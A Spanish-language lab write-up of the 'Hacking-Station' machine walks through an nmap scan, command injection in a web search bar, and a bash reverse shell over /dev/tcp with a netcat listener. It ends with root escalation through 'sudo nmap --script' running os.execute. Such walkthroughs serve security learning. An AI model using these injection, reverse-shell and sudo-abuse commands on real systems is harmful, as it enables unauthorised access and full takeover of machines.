# Hacking-Station by Zayru5

Skills: • Ejecución de comandos (Inyección de comandos)
• Abuso del Binario Nmap - (Sudo/Escalada de Privilegios)

![Alt text](Bajo/HackingStation/Images/Info_Machine.png)

# 🧠 **Skills Adquiridas y Aprendizajes Clave**

## 🔎 **Reconocimiento y Enumeración**

- Escaneo completo de puertos con `nmap`
- Detección de servicios y versiones
- Fingerprinting de sistema operativo

## 🌐 **Hacking Web**

- Inyección de comandos (Command Injection)
- Análisis de formularios y entradas vulnerables
- Comprensión del comportamiento del backend

## 📡 **Networking / Shell Remota**

- Uso de `netcat` para establecer reverse shells
- Redirección de flujos de entrada/salida en Bash
- Establecimiento y control de sesiones remotas

## 🧬 **Linux Básico**

- Navegación por el sistema de archivos
- Lectura de archivos sensibles (`user.txt`, etc.)
- Uso de comandos como `cd`, `ls`, `cat`, `whoami`, `pwd`

## 🧨 **Escalada de Privilegios**

- Uso de `sudo -l` para identificar binarios vulnerables
- Abuso de permisos sudo en binarios como `nmap`
- Ejecución de código como root

## 🔧 **Habilidades Técnicas**

- Uso de `bash`, `netcat`, `nmap`
- Inyección de comandos
- Manejo de shell remota
- Enumeración de privilegios
- Escalada local a root

# **Escaneo y Enumeración**

![ip.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/ip.png)

![nmap.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/nmap.png)

- Servicios activos y puertos abiertos
    - El host en la dirección IP `192.168.11.10` tiene el puerto TCP 80 abierto y está ejecutando un servidor web Apache versión 2.4.57 en un sistema Debian.

![nmap.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/nmap%201.png)

```bash
nmap -p- --open -sSCV --min-rate 5000 -vvv -n -Pn 192.168.11.10 -oN Scan
```

- **nmap**: network mapper
- **-p-**: Escanea todos los puertos TCP (65535)
- **--open**: Muestar puertos solo en estado abierto.
- **-sSCV**: Combinación de varias opciones
    - -sS: SYN Scan o Stealth Scan: envía paquetes SYN (synchronize) a los puertos objetivo. No hay finalización del Tree Way Hand Shake.Es un escaneo "sigiloso" porque no establece conexiones TCP completas
    - -sC: Script Scan: Ejecuta un conjunto de scripts de Nmap Scripting Engine (NSE) contra los puertos que se encuentran abiertos.La opción `-sC` ejecuta la categoría de scripts "default", que se considera un buen conjunto de scripts para un análisis general.
    - -sV: Version Detection Intenta determinar la versión del software que se está ejecutando en los puertos abiertos.
- **--min-rate 5000**: Intenta enviar paquetes a una velocidad mínima de 5000 paquetes por segundo. Acelera el escáneo.
- **-vvv**: Aumenta el nivel de verbosidad al máximo. Esto hará que `nmap` muestre mucha más información sobre el progreso del escaneo, los paquetes enviados y recibidos, los scripts que se están ejecutando, y cualquier error o advertencia.
- **-n**:No realizar resolución DNS en los hosts objetivo.  Por defecto, `nmap` intenta resolver el nombre de dominio asociado a la dirección IP. Esta opción le indica que omita este paso, lo que puede acelerar el escaneo, especialmente si se están escaneando muchas direcciones IP.
- **-Pn**: Saltar el descubrimiento de hosts. Asume que el host está activo.  Normalmente, `nmap` realiza un "ping" u otras técnicas de descubrimiento de hosts para determinar si un host está activo antes de escanear sus puertos.Esto es útil si el host objetivo bloquea las peticiones de ping o si ya sabes que el host está activo.
- -**oN** Scan: Guarda la salida del escaneo en formato "normal" en un archivo llamado "Scan" (sin extensión). Este es un formato legible por humanos que muestra los resultados del escaneo de una manera organizada.

# Pagina Web Hackingstation

![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage.png)

![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage%201.png)

- Podemos ver que es una página web que se encarga de buscar exploits.
- Se utilizo Android para realizar una búsqueda de Exploits en este SO, la pagina devuelve gran variedad de resultados en donde la palabra Android se encuentra en los Exploits listados.

## Inyectando comandos

![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage%202.png)

![webpage.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/webpage%203.png)

Se logra descubrir que en la barra de búsqueda, la página permite ejecutar comandos después de agregar un punto y coma (;).

Comando utilizado:

```bash
zayrus; pwd; whoami
```

- Cuando una página web permite el uso de un punto y coma (`;`) seguido de un comando del sistema operativo, y ejecuta ese comando devolviendo su resultado, estamos ante una **vulnerabilidad de inyección de comandos** (también conocida como **command injection**).
- **El Punto y Coma (`;`) como Separador de Comandos:** En muchos sistemas operativos (como Linux y Unix, que suelen ser la base de muchos servidores web), el punto y coma se utiliza para separar múltiples comandos en una sola línea. El sistema operativo interpreta cada parte separada por el punto y coma como un comando independiente que debe ejecutar secuencialmente.
- El hecho de que la página web devuelva "hacker" indica que el comando `whoami` se ejecutó en el servidor donde reside la aplicación web, y el usuario bajo el cual corre el proceso del servidor web tiene el nombre "hacker"

# Explotación

## Shell Inversa

Al evidenciar que se puede inyectar comandos, procedemos a hacer una reverse shell para ingresar al sistema desde nuestra terminal.

### Listener

![listener.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/listener.png)

Comando listener:

```bash
nc -lvnp 8000
```

**El comando `nc -lvnp 8000` hace lo siguiente:**

1. **`nc -l`**: Pone a Netcat en modo de escucha.
2. **`v`**: Muestra información detallada sobre la conexión.
3. **`n`**: Evita la resolución de nombres DNS.
4. **`p 8000`**: Escucha las conexiones entrantes en el puerto TCP 8000.

### Reverse shell

![reverse.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/reverse.png)

```bash
zayrus; bash -c 'bash -i >& /dev/tcp/192.168.11.11/8000 0>&1’
```

Este es un método común para obtener una shell remota en un sistema comprometido.

- El primer `bash` invoca el intérprete de comandos Bash.
- La opción `c` le indica a este primer `bash` que ejecute la cadena de texto que sigue.
- Dentro de la cadena, se invoca un segundo `bash` con la opción `i` para intentar obtener una shell interactiva.
- `>& /dev/tcp/192.168.11.11/8000` intenta abrir una conexión TCP al host `192.168.11.11` en el puerto `8000` y redirige tanto la salida estándar como la salida de error a esta conexión.
- `0>&1` redirige la entrada estándar para que también provenga de la conexión TCP.

### Flag user

![flaguser.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/flaguser.png)

1. Navegamos por el sistema hasta la carpeta home del usuario.
    1. Comando para ir al home del usuario
    
    ```bash
    cd ~
    ```
    
    b. Listamos los archivos
    
    ```bash
    ls
    ```
    
    c. Mostrar contenido del archivo
    
    ```bash
    cat user.txt
    ```
    
2. De esta manera encontramos la flag del usuario hacker.

### Escalada de Privilegios y Flag root

Listar los comandos permitidos con sudo

![sudo.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/sudo.png)

![1.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/1.png)

![1.png](Hacking-Station%20by%20Zayru5%201e0cb9b1e60b8072af4cf048231c9145/1%201.png)

1. Comando:

```bash
sudo -l
```

- Es una herramienta muy útil para **mostrar qué comandos se tiene permitido ejecutar con `sudo` en el sistema con el usuario actual**. Piensa en ello como una lista de "superpoderes" autorizados.

1. Después de ejecutar vemos que el usuario "hacker" tiene permiso para ejecutar **únicamente** el comando `/usr/bin/nmap` con privilegios de **root** y **sin necesidad de ingresar su contraseña**.

```bash
User hacker may run the following commands on HackingStation:
    (root) NOPASSWD: /usr/bin/nmap
```

```bash
TF=$(mktemp) 
echo 'os.execute("/bin/bash")' > $TF 
sudo nmap --script=$TF
```

Este conjunto de comandos tiene implicaciones importantes y puede ser peligroso si se ejecuta sin el conocimiento adecuado. Aquí está el desglose:

1. **TF=$(mktemp)**
    - Crea un archivo temporal y almacena su ruta en la variable `TF`.
2. **echo 'os.execute("/bin/sh")' > $TF**
    - Escribe el código `os.execute("/bin/bash")` en el archivo temporal. Este código ejecutará una shell (`/bin/bash`).
3. **sudo nmap --script=$TF**
    - Ejecuta `nmap` con permisos de administrador (`sudo`) e intenta usar el archivo temporal como un script de Nmap.
    - Si `nmap` tiene configuraciones que permiten ejecutar scripts de usuario, podría ejecutar el código dentro del archivo, iniciando una shell interactiva.
